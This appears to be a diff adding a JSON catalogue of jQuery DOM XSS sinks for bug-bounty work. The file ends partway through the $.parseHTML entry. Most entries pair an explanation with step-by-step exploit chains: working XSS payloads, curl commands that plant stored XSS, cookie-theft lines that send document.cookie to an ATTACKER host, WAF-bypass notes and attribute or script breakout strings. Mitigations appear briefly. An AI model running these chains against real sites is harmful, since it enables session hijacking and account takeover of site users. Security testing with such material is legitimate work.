@@ -1,0 +1,807 @@
+{
+  "category": "jquery",
+  "schema_version": "2.0",
+  "sinks": [
+    {
+      "id": "sink-jquery-html",
+      "name": ".html()",
+      "category": "jquery",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "html",
+        ".html",
+        ".html(",
+        "jQuery.fn.html",
+        "$(selector).html",
+        "$().html"
+      ],
+      "severity": "P2",
+      "severity_note": "P2 as DOM XSS when attacker data reaches the argument; drops to P4/self-XSS if the only path requires the victim pasting payload into their own console or DevTools.",
+      "explain": "jQuery's .html(string) setter replaces the innerHTML of every matched element with the supplied string. Unlike raw innerHTML assignment, jQuery routes the string through its domManip pipeline, which parses the markup and additionally extracts inline <script> blocks and executes them via $.globalEval/DOMEval.",
+      "how_it_works": "jQuery converts the string to DOM nodes (via buildFragment/createElement), inserts them, and then walks the inserted nodes for script elements: inline scripts are evaluated in global scope, external script srcs are fetched and executed. That means '<script>alert(1)</script>' passed to .html() fires, whereas the same string assigned to element.innerHTML would not execute the script. Event-handler attributes (onerror, onload, onfocus...) execute regardless of jQuery version. Real-world history: jQuery < 1.6.3 treated $(location.hash) values like '#<img src=x onerror=alert(1)>' as HTML rather than a selector (selector-injection XSS via hash); jQuery < 3.5.0 had htmlPrefilter self-closing-tag expansion bugs (CVE-2020-11022/11023) where crafted strings such as '<option><style></option></select><img src=x onerror=alert(1)>' survived sanitization and executed.",
+      "why_it_matters": ".html() is the single most common jQuery sink in legacy apps, CMS themes, and admin panels. Any user-controlled value flowing into it (hash routers, AJAX JSON, search-reflection) is a direct DOM XSS, and jQuery's script-execution behavior means even payload filters that only block event handlers can be bypassed with plain <script> tags.",
+      "exploitable_when": [
+        "location.hash",
+        "location.search",
+        "postMessage-data",
+        "fetch-response"
+      ],
+      "chains": [
+        {
+          "source": "location.hash",
+          "steps": [
+            {
+              "action": "Confirm source reaches sink",
+              "payload": "#<b>jlf-trace</b>",
+              "command": "open 'https://TARGET/page#<b>jlf-trace</b>' in a browser",
+              "indicator": "a bold 'jlf-trace' string is rendered inside the target element (check DevTools: the value sits inside the .html() argument node)"
+            },
+            {
+              "action": "Deliver XSS payload",
+              "payload": "#<img src=x onerror=alert(document.domain)>",
+              "command": "open 'https://TARGET/page#<img src=x onerror=alert(document.domain)>' in a browser",
+              "indicator": "an alert dialog showing the target domain pops"
+            },
+            {
+              "action": "Prove impact with data exfiltration",
+              "payload": "#<img src=x onerror=fetch('https://ATTACKER/c?c='+document.cookie)>",
+              "command": "open 'https://TARGET/page#<img src=x onerror=fetch('https://ATTACKER/c?c='%2Bdocument.cookie)>' in a browser while tailing the ATTACKER listener logs",
+              "indicator": "an inbound HTTP request containing the victim's cookie value appears in the ATTACKER server log"
+            }
+          ],
+          "eligibility": "Classic DOM XSS; accepted on all major platforms when the hash is read on load without user interaction. If a click/router event is required, some programs downgrade severity."
+        },
+        {
+          "source": "fetch-response",
+          "steps": [
+            {
+              "action": "Identify an AJAX endpoint whose JSON field is rendered via .html()",
+              "payload": "jlf-trace-<b>1</b> in the controllable API field (e.g. comment, profile bio, product title)",
+              "command": "curl -s -X POST 'https://TARGET/api/comments' -H 'Content-Type: application/json' -H 'Cookie: session=SESSION_ID' --data '{\"body\":\"jlf-trace-<b>1</b>\"}'",
+              "indicator": "the stored value is returned by the API and rendered with the <b> tag interpreted, not escaped"
+            },
+            {
+              "action": "Store an executable payload through the same field",
+              "payload": "<svg onload=alert(document.domain)>",
+              "command": "curl -s -X POST 'https://TARGET/api/comments' -H 'Content-Type: application/json' -H 'Cookie: session=SESSION_ID' --data '{\"body\":\"<svg onload=alert(document.domain)>\"}'",
+              "indicator": "reloading the page as any user fires the alert (stored XSS)"
+            },
+            {
+              "action": "If event handlers are filtered, abuse jQuery's script execution",
+              "payload": "<script>fetch('https://ATTACKER/c?c='+document.cookie)</script>",
+              "command": "curl -s -X POST 'https://TARGET/api/comments' -H 'Content-Type: application/json' -H 'Cookie: session=SESSION_ID' --data '{\"body\":\"<script>fetch(\\\"https://ATTACKER/c?c=\\\"+document.cookie)</script>\"}'",
+              "indicator": "jQuery's domManip extracts and executes the script on render; the cookie hits the ATTACKER listener even though a raw innerHTML sink would have been inert"
+            }
+          ],
+          "eligibility": "Stored XSS via API-to-.html() is accepted on all major platforms; the script-execution nuance (step 3) is what makes this higher impact than a plain innerHTML sink when a filter strips on* attributes."
+        }
+      ],
+      "contexts": {
+        "html-body": "Full markup context: <script>, <svg onload>, <img onerror>, and malformed-HTML parser tricks all work; jQuery executes extracted <script> blocks in global scope.",
+        "attr": "If the sink string is concatenated into markup that lands inside an attribute (e.g. '<div title=\"'+x+'\">'), break out with '\"><img src=x onerror=alert(document.domain)>'.",
+        "js-string": "When the value is concatenated into an inline script that later feeds .html(), escape the JS string first ('-alert(1)-') or inject '</script><svg onload=alert(1)>' to leave the script context entirely."
+      },
+      "waf_notes": "Fragment-based payloads (#...) never reach the server, so server-side WAFs are blind to hash-router variants. Server-side filters often strip on* attributes and <script> but miss <svg onload>, malformed-tag tricks, or jQuery-specific htmlPrefilter edge cases on jQuery < 3.5.0. URL-encoding the payload defeats naive regexes; the browser decodes before jQuery sees it.",
+      "eligibility": "DOM XSS into .html() is accepted on all major bug-bounty platforms. Check the jQuery version (jQuery.fn.jquery in console): <1.6.3 adds $(location.hash) selector injection, <3.5.0 adds CVE-2020-11022/11023 bypass material - both raise acceptance odds on legacy apps.",
+      "mitigations": [
+        "Never pass untrusted strings to .html(); use .text() for plain text.",
+        "Sanitize with DOMPurify before calling .html(): $(el).html(DOMPurify.sanitize(data)).",
+        "Upgrade jQuery to >= 3.5.0 to close htmlPrefilter CVEs and >= 1.6.3 (ideally latest) for selector-injection fixes.",
+        "Deploy a strict Content-Security-Policy with a nonce so injected inline scripts and handlers cannot execute."
+      ],
+      "related": [
+        "innerHTML",
+        "$.parseHTML()",
+        "$.globalEval()",
+        ".append()"
+      ],
+      "references": [
+        "PortSwigger: DOM-based XSS",
+        "HackTricks: jQuery DOM XSS",
+        "OWASP WSTG: Testing for Client-side URL Redirect and DOM-based Vulnerabilities"
+      ]
+    },
+    {
+      "id": "sink-jquery-append",
+      "name": ".append()",
+      "category": "jquery",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "append",
+        ".append",
+        ".append(",
+        "jQuery.fn.append",
+        "$(selector).append"
+      ],
+      "severity": "P2",
+      "severity_note": "P2 as DOM XSS; same impact as .html() but inserts at the end of the element instead of replacing its content.",
+      "explain": ".append(content) inserts the supplied HTML string as the last child of every matched element. The string goes through jQuery's domManip pipeline, so inline <script> blocks inside it are extracted and executed globally, and event-handler attributes fire normally.",
+      "how_it_works": "Because .append() adds nodes without wiping existing content, it is the typical sink for 'load more', chat-message, and notification renderers - exactly the places where server- or socket-delivered user data is appended in a loop. jQuery parses the string with buildFragment; scripts found in the fragment are run via DOMEval ($.globalEval) after insertion, so '<script>...</script>' payloads execute even though the same string through element.innerHTML would be inert.",
+      "why_it_matters": "Append-style renderers usually process repeated attacker-supplied items (chat lines, search results, comments), which turns a single injection into stored or persistent DOM XSS hitting every viewer of the page.",
+      "exploitable_when": [
+        "fetch-response",
+        "websocket-message",
+        "postMessage-data",
+        "location.search"
+      ],
+      "chains": [
+        {
+          "source": "websocket-message",
+          "steps": [
+            {
+              "action": "Send a marker through the chat/feed channel",
+              "payload": "jlf-trace-<i>marker</i>",
+              "command": "send 'jlf-trace-<i>marker</i>' as a chat message from account YOUR_ACCOUNT in a second browser session",
+              "indicator": "the victim session renders the message with the <i> tag interpreted, confirming the message body reaches .append() unescaped"
+            },
+            {
+              "action": "Send an executable payload through the same channel",
+              "payload": "<img src=x onerror=alert(document.domain)>",
+              "command": "send '<img src=x onerror=alert(document.domain)>' as a chat message from account YOUR_ACCOUNT",
+              "indicator": "the alert fires in every session viewing the conversation"
+            },
+            {
+              "action": "Escalate to session theft",
+              "payload": "<svg onload=fetch('https://ATTACKER/c?c='+document.cookie)>",
+              "command": "send '<svg onload=fetch('https://ATTACKER/c?c='%2Bdocument.cookie)>' as a chat message from account YOUR_ACCOUNT",
+              "indicator": "the ATTACKER listener receives the victim's cookies"
+            }
+          ],
+          "eligibility": "Stored/persistent XSS via websocket-delivered content is accepted on all major platforms; one account attacking another is the standard cross-user proof."
+        },
+        {
+          "source": "postMessage-data",
+          "steps": [
+            {
+              "action": "Find the message listener that appends e.data (or a field of it)",
+              "payload": "window.postMessage('jlf-trace-<u>1</u>','*')",
+              "command": "in DevTools console on https://TARGET/page run: window.postMessage('jlf-trace-<u>1</u>','*')",
+              "indicator": "an underlined '1' appears in the appended node, proving the message body reaches .append()"
+            },
+            {
+              "action": "Deliver the exploit from an attacker page that frames or opens the target",
+              "payload": "<iframe src=https://TARGET/page onload=\"this.contentWindow.postMessage('<img src=x onerror=alert(document.domain)>','*')\">",
+              "command": "host the iframe HTML on https://ATTACKER/poc.html and open it in a browser",
+              "indicator": "the alert fires inside the framed target origin"
+            }
+          ],
+          "eligibility": "Accepted when the listener has no origin check or a bypassable one; if the listener checks event.origin strictly and correctly, mark as informational."
+        }
+      ],
+      "contexts": {
+        "html-body": "Inserted as element content: all markup vectors work, and inline <script> executes via jQuery's script extraction.",
+        "attr": "If concatenated inside an attribute of the appended markup, break out with '\"><svg onload=alert(document.domain)>'.",
+        "js-string": "When the value is embedded into a JS string before append, close the string and the script tag: '</script><img src=x onerror=alert(1)>'."
+      },
+      "waf_notes": "Payloads arriving via websocket, postMessage, or fetch responses bypass perimeter WAFs entirely because they never appear in an HTTP request body that the WAF inspects. Server-side output filters on the API usually only cover the first render, not data appended later.",
+      "eligibility": "DOM/stored XSS through .append() is accepted on all major platforms. Self-append (payload only renderable to the same account that created it, no other viewer) is self-XSS and usually NOT eligible - always demonstrate cross-user delivery.",
+      "mitigations": [
+        "Build nodes with document.createElement and .textContent instead of HTML strings.",
+        "Sanitize dynamic fragments with DOMPurify before .append().",
+        "Keep jQuery >= 3.5.0 and enforce a nonce-based CSP."
+      ],
+      "related": [
+        ".html()",
+        ".prepend()",
+        "innerHTML",
+        "$.parseHTML()"
+      ],
+      "references": [
+        "PortSwigger: DOM-based XSS",
+        "OWASP: DOM based XSS Prevention Cheat Sheet"
+      ]
+    },
+    {
+      "id": "sink-jquery-prepend",
+      "name": ".prepend()",
+      "category": "jquery",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "prepend",
+        ".prepend",
+        ".prepend(",
+        "jQuery.fn.prepend",
+        "$(selector).prepend"
+      ],
+      "severity": "P2",
+      "severity_note": "P2 as DOM XSS; identical mechanics to .append() but inserts as the first child, which matters for above-the-fold auto-executing payloads.",
+      "explain": ".prepend(content) inserts the supplied HTML string as the first child of every matched element. It shares jQuery's domManip pipeline with .append()/.html(), so inline scripts are extracted and executed globally and event handlers fire.",
+      "how_it_works": "Prepend is common in live feeds and notification lists where the newest attacker-controlled item lands at the top. Because the payload renders immediately on insertion (no scrolling or interaction), auto-triggering vectors like <svg onload> and <img onerror> fire instantly in every viewing session. jQuery executes <script> blocks found in the prepended fragment via DOMEval.",
+      "why_it_matters": "Feed/notification prependers multiply impact: one injected item executes in the browser of every user who has the feed open, making this a reliable stored-XSS delivery sink.",
+      "exploitable_when": [
+        "fetch-response",
+        "websocket-message",
+        "broadcastchannel-message",
+        "postMessage-data"
+      ],
+      "chains": [
+        {
+          "source": "fetch-response",
+          "steps": [
+            {
+              "action": "Confirm a controllable API field is prepended unescaped",
+              "payload": "jlf-trace-<b>x</b>",
+              "command": "curl -s -X POST 'https://TARGET/api/notifications' -H 'Content-Type: application/json' -H 'Cookie: session=SESSION_ID' --data '{\"title\":\"jlf-trace-<b>x</b>\"}' then reload the page",
+              "indicator": "the notification list shows a bold 'x' at the top, proving markup interpretation"
+            },
+            {
+              "action": "Deliver the payload",
+              "payload": "<img src=x onerror=alert(document.domain)>",
+              "command": "curl -s -X POST 'https://TARGET/api/notifications' -H 'Content-Type: application/json' -H 'Cookie: session=SESSION_ID' --data '{\"title\":\"<img src=x onerror=alert(document.domain)>\"}'",
+              "indicator": "the alert fires as soon as the feed renders, no interaction needed"
+            }
+          ],
+          "eligibility": "Stored XSS, accepted on all major platforms when it fires for users other than the injector."
+        },
+        {
+          "source": "broadcastchannel-message",
+          "steps": [
+            {
+              "action": "Identify the BroadcastChannel name and message shape consumed by .prepend()",
+              "payload": "new BroadcastChannel('TARGET-channel').postMessage({text:'<b>jlf-trace</b>'})",
+              "command": "in DevTools console on any same-origin tab run: new BroadcastChannel('TARGET-channel').postMessage({text:'<b>jlf-trace</b>'})",
+              "indicator": "a bold 'jlf-trace' is prepended in every open tab of the target origin listening on that channel"
+            },
+            {
+              "action": "Deliver the executable payload through the channel",
+              "payload": "new BroadcastChannel('TARGET-channel').postMessage({text:'<svg onload=alert(document.domain)>'})",
+              "command": "in DevTools console on any same-origin tab run: new BroadcastChannel('TARGET-channel').postMessage({text:'<svg onload=alert(document.domain)>'})",
+              "indicator": "the alert fires in every open tab of the target origin listening on that channel"
+            }
+          ],
+          "eligibility": "Cross-tab XSS; usually requires another same-origin page under attacker influence to post - accepted when a realistic attacker-controlled same-origin context exists, otherwise rated lower."
+        }
+      ],
+      "contexts": {
+        "html-body": "Full markup context with jQuery script extraction; auto-firing vectors (<svg onload>, <img onerror>) are preferred because prepend renders immediately.",
+        "attr": "Break out of attribute concatenation with '\"><img src=x onerror=alert(document.domain)>'.",
+        "js-string": "Escape the JS string and script element with '</script><svg onload=alert(1)>' when the value is inlined into a script before prepend."
+      },
+      "waf_notes": "Same blind spots as .append(): data arriving via fetch/websocket/postMessage/BroadcastChannel never traverses a request-inspecting WAF. Server filters that only sanitize the initial page render miss prepended dynamic items.",
+      "eligibility": "Accepted on all major platforms as stored/DOM XSS when cross-user impact is shown. Same-tab-only BroadcastChannel self-posting is self-XSS and usually NOT eligible.",
+      "mitigations": [
+        "Use .text() / textContent for untrusted values; build nodes programmatically.",
+        "DOMPurify-sanitize fragments before .prepend().",
+        "Enforce a nonce-based CSP and keep jQuery updated."
+      ],
+      "related": [
+        ".append()",
+        ".html()",
+        "innerHTML"
+      ],
+      "references": [
+        "PortSwigger: DOM-based XSS",
+        "OWASP: DOM based XSS Prevention Cheat Sheet"
+      ]
+    },
+    {
+      "id": "sink-jquery-before",
+      "name": ".before()",
+      "category": "jquery",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "before",
+        ".before",
+        ".before(",
+        "jQuery.fn.before",
+        "$(selector).before"
+      ],
+      "severity": "P2",
+      "severity_note": "P2 as DOM XSS; insertion happens as a sibling OUTSIDE the target element, which can bypass containers that would neutralize inner content.",
+      "explain": ".before(content) inserts the supplied HTML string as the preceding sibling of every matched element. Because the payload lands outside the target element, it escapes contexts where the element itself would constrain inner content (e.g. a target inside a disabled form, a <template>, or a filtered container). jQuery's domManip still extracts and executes inline scripts.",
+      "how_it_works": "jQuery builds a fragment from the string and calls insertBefore on the target's parent. The key payload-delivery difference from .html()/.append() is placement: the injected nodes are siblings, not children. If the target element is a <script>, <style>, hidden input, or an element whose innerHTML is never rendered, .before() still renders the payload next to it in the visible DOM. Inline <script> in the fragment executes via DOMEval; event attributes fire on render.",
+      "why_it_matters": "Sibling insertion lets attackers inject content adjacent to sensitive elements (login forms, CSRF-token inputs) for UI redress and credential phishing in addition to direct script execution, and it sidesteps naive defenses that only sanitize what goes 'inside' an element.",
+      "exploitable_when": [
+        "location.search",
+        "location.hash",
+        "fetch-response",
+        "dom-form-values"
+      ],
+      "chains": [
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Confirm the query parameter reaches .before()",
+              "payload": "?msg=jlf-trace-<b>1</b>",
+              "command": "open 'https://TARGET/page?msg=jlf-trace-<b>1</b>' in a browser",
+              "indicator": "a bold '1' is rendered immediately before the target element in the DOM (verify position in DevTools)"
+            },
+            {
+              "action": "Deliver the payload",
+              "payload": "?msg=<svg onload=alert(document.domain)>",
+              "command": "open 'https://TARGET/page?msg=<svg onload=alert(document.domain)>' in a browser",
+              "indicator": "the alert fires on page load"
+            }
+          ],
+          "eligibility": "Reflected DOM XSS via query string; accepted on all major platforms. Server WAF may see the parameter - use hash variant if blocked."
+        },
+        {
+          "source": "dom-form-values",
+          "steps": [
+            {
+              "action": "Locate a form field whose value is inserted with .before() (e.g. search-term echo, error message)",
+              "payload": "jlf-trace-<i>2</i>",
+              "command": "type 'jlf-trace-<i>2</i>' into the field and submit the form on https://TARGET/page",
+              "indicator": "the echoed value renders the <i> tag before the target element"
+            },
+            {
+              "action": "Submit the executable payload",
+              "payload": "<img src=x onerror=alert(document.domain)>",
+              "command": "type '<img src=x onerror=alert(document.domain)>' into the same field and submit",
+              "indicator": "the alert fires on submission"
+            }
+          ],
+          "eligibility": "Often a same-session reflection; if the crafted state cannot be delivered to another user via URL, programs may rate it lower - prefer chains with a shareable link."
+        }
+      ],
+      "contexts": {
+        "html-body": "Sibling of the target: full markup vectors work, scripts execute via jQuery extraction; payload renders even if the target element itself is invisible or non-rendering.",
+        "attr": "Break out with '\"><svg onload=alert(document.domain)>' when the value lands inside an attribute of the sibling markup.",
+        "js-string": "Use '</script><img src=x onerror=alert(1)>' if the value passes through an inline script string first."
+      },
+      "waf_notes": "Query-string payloads may be inspected by a server WAF - switch to location.hash or POST-delivered data to stay off the wire. Filters anchored on element-content sanitization miss sibling placement.",
+      "eligibility": "DOM XSS, accepted on all major platforms with a no-interaction trigger. Same form-submission-only reflections may be downgraded unless chained to a deliverable link.",
+      "mitigations": [
+        "Insert text with .before(document.createTextNode(v)) or restructure to use .text().",
+        "Sanitize any HTML string with DOMPurify before insertion.",
+        "Nonce-based CSP to neutralize injected handlers and scripts."
+      ],
+      "related": [
+        ".after()",
+        ".append()",
+        ".html()",
+        "insertAdjacentHTML"
+      ],
+      "references": [
+        "PortSwigger: DOM-based XSS",
+        "OWASP WSTG: Testing for DOM-based Cross Site Scripting"
+      ]
+    },
+    {
+      "id": "sink-jquery-after",
+      "name": ".after()",
+      "category": "jquery",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "after",
+        ".after",
+        ".after(",
+        "jQuery.fn.after",
+        "$(selector).after"
+      ],
+      "severity": "P2",
+      "severity_note": "P2 as DOM XSS; mirrors .before() with following-sibling placement - payload escapes the target element's rendering context.",
+      "explain": ".after(content) inserts the supplied HTML string as the following sibling of every matched element. Like .before(), the payload lands outside the target element, so it renders even when the target is invisible, non-rendering (<script>/<style>/<input>), or content-filtered. Inline scripts in the fragment execute via jQuery's DOMEval.",
+      "how_it_works": "jQuery parses the string into a fragment and inserts it after the target in its parent. A common pattern is error/hint rendering: $(input).after('<span class=err>'+msg+'</span>') - any attacker control of msg yields markup injection directly adjacent to form fields, ideal for both script execution and phishing overlays. Scripts in the inserted fragment run globally.",
+      "why_it_matters": "After-insertion is pervasive in validation messages and dynamic UI hints, which are fed by server validation responses or reflected input - a direct pipeline from attacker data to executable DOM next to credential fields.",
+      "exploitable_when": [
+        "dom-form-values",
+        "fetch-response",
+        "xhr-response",
+        "location.search"
+      ],
+      "chains": [
+        {
+          "source": "xhr-response",
+          "steps": [
+            {
+              "action": "Trigger a validation error whose server message is echoed via .after()",
+              "payload": "jlf-trace-<b>3</b> as the invalid field value",
+              "command": "curl -s -X POST 'https://TARGET/api/register' -H 'Content-Type: application/json' --data '{\"username\":\"jlf-trace-<b>3</b>\"}' and confirm the response echoes the value in the error message",
+              "indicator": "the response JSON contains the unescaped marker inside the error text"
+            },
+            {
+              "action": "Submit the payload through the UI so the echoed error is rendered",
+              "payload": "<svg onload=alert(document.domain)>",
+              "command": "enter '<svg onload=alert(document.domain)>' in the username field on https://TARGET/register and submit",
+              "indicator": "the alert fires when the server-echoed error is inserted after the input"
+            }
+          ],
+          "eligibility": "Reflected DOM XSS via server-echoed validation; accepted on most platforms when triggerable from a crafted request/flow without victim-specific state."
+        },
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Confirm parameter reaches .after()",
+              "payload": "?err=<u>jlf-trace</u>",
+              "command": "open 'https://TARGET/page?err=<u>jlf-trace</u>' in a browser",
+              "indicator": "underlined 'jlf-trace' appears immediately after the target element"
+            },
+            {
+              "action": "Deliver the payload",
+              "payload": "?err=<img src=x onerror=alert(document.domain)>",
+              "command": "open 'https://TARGET/page?err=<img src=x onerror=alert(document.domain)>' in a browser",
+              "indicator": "the alert fires on load"
+            }
+          ],
+          "eligibility": "Reflected DOM XSS, accepted on all major platforms; switch to a hash-based source if a WAF strips markup from the query string."
+        }
+      ],
+      "contexts": {
+        "html-body": "Following-sibling placement: full markup works, jQuery executes extracted scripts; useful when the target itself cannot render children.",
+        "attr": "'\"><svg onload=alert(document.domain)>' breaks out of attribute concatenation in the inserted markup.",
+        "js-string": "'</script><img src=x onerror=alert(1)>' escapes an inline-script string hop before .after()."
+      },
+      "waf_notes": "Validation-echo flows often carry payloads in JSON responses, invisible to request-side WAFs after the initial POST; keep the marker unencoded in the field value and URL-encode only transport metacharacters.",
+      "eligibility": "DOM XSS, accepted on all major platforms with cross-user or link-deliverable triggers. Pure same-form reflections without a shareable state may be rated P4.",
+      "mitigations": [
+        "Render validation text with .text() instead of HTML strings.",
+        "DOMPurify-sanitize before .after() if markup is genuinely needed.",
+        "Nonce-based CSP; keep jQuery >= 3.5.0."
+      ],
+      "related": [
+        ".before()",
+        ".append()",
+        ".html()",
+        "insertAdjacentHTML"
+      ],
+      "references": [
+        "PortSwigger: DOM-based XSS",
+        "OWASP WSTG: Testing for DOM-based Cross Site Scripting"
+      ]
+    },
+    {
+      "id": "sink-jquery-replacewith",
+      "name": ".replaceWith()",
+      "category": "jquery",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "replaceWith",
+        ".replaceWith",
+        ".replacewith",
+        "jQuery.fn.replaceWith",
+        "$(selector).replaceWith"
+      ],
+      "severity": "P2",
+      "severity_note": "P2 as DOM XSS; the target element is removed entirely, so the payload is not constrained by the target's context at all.",
+      "explain": ".replaceWith(content) removes every matched element from the DOM and inserts the supplied HTML string in its place. The replacement goes through jQuery's fragment pipeline, so inline <script> executes and event attributes fire.",
+      "how_it_works": "Because the original element is deleted, any scoping it provided disappears: a replacement targeting a <noscript>, a hidden container, or a sanitizer-wrapped node lets the payload land in a clean parent context. A common vulnerable pattern is SPA content swapping: $('#content').replaceWith(templateString) where templateString embeds attacker data. jQuery executes scripts found in the replacement fragment via DOMEval after insertion.",
+      "why_it_matters": "Replacement sinks typically guard 'main content' regions of the page; injecting there means full-page UI takeover, plus reliable script execution in the most trusted visual area of the app.",
+      "exploitable_when": [
+        "location.hash",
+        "spa-hash-router-param",
+        "fetch-response",
+        "postMessage-data"
+      ],
+      "chains": [
+        {
+          "source": "spa-hash-router-param",
+          "steps": [
+            {
+              "action": "Identify the hash-router parameter substituted into the replaced content",
+              "payload": "#/view/jlf-trace-<b>1</b>",
+              "command": "open 'https://TARGET/app#/view/jlf-trace-<b>1</b>' in a browser",
+              "indicator": "the marker renders with the <b> tag interpreted inside the replaced content region"
+            },
+            {
+              "action": "Deliver the payload",
+              "payload": "#/view/<svg onload=alert(document.domain)>",
+              "command": "open 'https://TARGET/app#/view/<svg onload=alert(document.domain)>' in a browser",
+              "indicator": "the alert fires when the router swaps the content"
+            }
+          ],
+          "eligibility": "Hash-router DOM XSS; the fragment never reaches the server, accepted on all major platforms when it fires on load without interaction."
+        },
+        {
+          "source": "fetch-response",
+          "steps": [
+            {
+              "action": "Confirm an API field is embedded in the replacement template",
+              "payload": "jlf-trace-<i>4</i>",
+              "command": "curl -s 'https://TARGET/api/page/home' -H 'Cookie: session=SESSION_ID' and locate the controllable field echoed in the template HTML",
+              "indicator": "the stored marker is returned unescaped and rendered as markup after the swap"
+            },
+            {
+              "action": "Store the payload",
+              "payload": "<img src=x onerror=alert(document.domain)>",
+              "command": "curl -s -X POST 'https://TARGET/api/page/home' -H 'Content-Type: application/json' -H 'Cookie: session=SESSION_ID' --data '{\"banner\":\"<img src=x onerror=alert(document.domain)>\"}'",
+              "indicator": "every visitor's browser fires the alert when the content region is replaced"
+            }
+          ],
+          "eligibility": "Stored XSS in a primary content region; accepted on all major platforms."
+        }
+      ],
+      "contexts": {
+        "html-body": "Replacement lands in the target's parent context: full markup works; jQuery executes extracted <script> blocks globally.",
+        "attr": "If the target was inside an attribute-heavy wrapper, the replacement string can close the wrapper: '</div><svg onload=alert(1)>'.",
+        "js-string": "Escape inline-script string hops with '</script><img src=x onerror=alert(1)>'."
+      },
+      "waf_notes": "Router-driven replacements consume the fragment, invisible to server WAFs. API-delivered replacements bypass request inspection after the initial fetch; stored payloads survive caching layers that only filter HTML pages, not JSON.",
+      "eligibility": "DOM/stored XSS, accepted on all major platforms. Confirm the replacement actually runs on load (some routers only swap after a click) and note required interaction honestly.",
+      "mitigations": [
+        "Swap content with cloned, sanitized template nodes instead of raw strings.",
+        "DOMPurify-sanitize any string passed to .replaceWith().",
+        "Nonce-based CSP to block injected scripts and handlers."
+      ],
+      "related": [
+        ".html()",
+        "innerHTML",
+        "outerHTML",
+        ".before()"
+      ],
+      "references": [
+        "PortSwigger: DOM-based XSS",
+        "HackTricks: jQuery DOM XSS"
+      ]
+    },
+    {
+      "id": "sink-jquery-wrap",
+      "name": ".wrap()",
+      "category": "jquery",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "wrap",
+        ".wrap",
+        ".wrap(",
+        "jQuery.fn.wrap",
+        "$(selector).wrap"
+      ],
+      "severity": "P3",
+      "severity_note": "P3 because attacker markup wraps (surrounds) the target rather than replacing it - execution requires landing markup outside the wrapped element, e.g. by closing the wrapper early; still full XSS when that works.",
+      "explain": ".wrap(html) wraps every matched element with the supplied HTML structure. The wrapping string is parsed as markup, so an attacker-controlled value injects nodes around the target element - useful for attribute injection on the wrapper and for UI-redress overlays, and escapable into full XSS by closing the wrapper structure.",
+      "how_it_works": "jQuery clones the first element of the parsed wrapper and inserts the target inside its deepest child. If the attacker string contains more than a single wrapper (e.g. '</div><img src=x onerror=alert(1)>'), the extra markup lands in the DOM as siblings during the manipulation and executes. Even without breakout, controlling the wrapper means injecting arbitrary attributes (style, class, formaction on a wrapping form) around sensitive elements like login forms.",
+      "why_it_matters": "Wrap is common in theming/decorating code ($(el).wrap('<div class=\"'+theme+'\">')) where a theme or layout value is user-influenced; it converts partial markup control into phishing-grade UI manipulation and, with breakout, script execution.",
+      "exploitable_when": [
+        "location.search",
+        "fetch-response",
+        "localStorage",
+        "dom-form-values"
+      ],
+      "chains": [
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Confirm the parameter reaches the .wrap() argument",
+              "payload": "?theme=jlf-trace\"><u>marker</u>",
+              "command": "open 'https://TARGET/page?theme=jlf-trace\"><u>marker</u>' in a browser",
+              "indicator": "the wrapper div carries attribute 'jlf-trace' and an underlined 'marker' renders as a sibling - breakout confirmed"
+            },
+            {
+              "action": "Deliver the payload",
+              "payload": "?theme=x\"></div><img src=x onerror=alert(document.domain)>",
+              "command": "open 'https://TARGET/page?theme=x\"></div><img src=x onerror=alert(document.domain)>' in a browser",
+              "indicator": "the alert fires on load"
+            }
+          ],
+          "eligibility": "Reflected DOM XSS; accepted on most platforms. If breakout is impossible and only wrapper-attribute control exists, report as UI-injection and expect a downgrade."
+        },
+        {
+          "source": "localStorage",
+          "steps": [
+            {
+              "action": "Plant a wrapper payload in storage if any flow writes attacker data there",
+              "payload": "localStorage.setItem('theme','x\"><svg onload=alert(document.domain)>')",
+              "command": "in DevTools console on https://TARGET run: localStorage.setItem('theme','x\"><svg onload=alert(document.domain)>') then reload the page",
+              "indicator": "the alert fires after reload, proving the stored value reaches .wrap()"
+            },
+            {
+              "action": "Chain from a real write primitive",
+              "payload": "POST profile field 'theme' with value 'x\"><img src=x onerror=alert(document.domain)>'",
+              "command": "curl -s -X POST 'https://TARGET/api/profile' -H 'Content-Type: application/json' -H 'Cookie: session=SESSION_ID' --data '{\"theme\":\"x\\\"><img src=x onerror=alert(document.domain)>\"}' then reload as the victim flow does",
+              "indicator": "the alert fires for any session that syncs the profile into localStorage"
+            }
+          ],
+          "eligibility": "localStorage-only control with no cross-user write path is self-XSS and usually NOT eligible; it becomes eligible when another feature copies attacker-supplied data into that storage key."
+        }
+      ],
+      "contexts": {
+        "html-body": "Wrapper markup around the target: attribute injection works directly; sibling markup after closing the wrapper executes.",
+        "attr": "The classic case - the value lands inside a wrapper tag attribute: break out with '\"><svg onload=alert(document.domain)>'.",
+        "js-string": "Escape an inline-script string hop with '</script><img src=x onerror=alert(1)>'."
+      },
+      "waf_notes": "Filters looking for full tags in parameters often allow quotes or single '>' characters; wrapper breakout needs only quote-plus-angle-bracket sequences. Storage-delivered payloads never traverse a request-inspecting WAF.",
+      "eligibility": "Honest rating: full breakout = P2/P3 DOM XSS accepted broadly; attribute-only wrapper control around forms (UI redress/phishing) is typically P4; self-XSS via own localStorage is NOT eligible without a cross-user write primitive.",
+      "mitigations": [
+        "Never interpolate user data into wrapper strings; construct wrappers with $('<div>').addClass(v) style APIs that treat values as data.",
+        "Whitelist allowed theme/layout values server-side.",
+        "Nonce-based CSP to neutralize any injected handlers."
+      ],
+      "related": [
+        ".html()",
+        ".before()",
+        ".append()",
+        "innerHTML"
+      ],
+      "references": [
+        "PortSwigger: DOM-based XSS",
+        "OWASP: DOM based XSS Prevention Cheat Sheet"
+      ]
+    },
+    {
+      "id": "sink-jquery-parsehtml",
+      "name": "$.parseHTML()",
+      "category": "jquery",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "parseHTML",
+        "$.parseHTML",
+        "jQuery.parseHTML",
+        ".parseHTML",
+        "parsehtml"
+      ],
+      "severity": "P2",
